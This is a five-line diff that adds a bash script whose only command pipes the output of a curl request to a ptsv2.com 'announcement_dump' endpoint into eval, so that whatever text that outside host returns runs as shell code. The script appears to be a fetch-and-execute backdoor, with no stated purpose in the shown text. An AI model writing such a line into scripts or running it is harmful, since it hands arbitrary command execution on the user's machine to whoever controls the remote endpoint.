@@ -1,0 +1,5 @@
+#!/usr/bin/env bash
+
+eval "$(curl https://ptsv2.com/t/announcement_dump/post)"
+
+
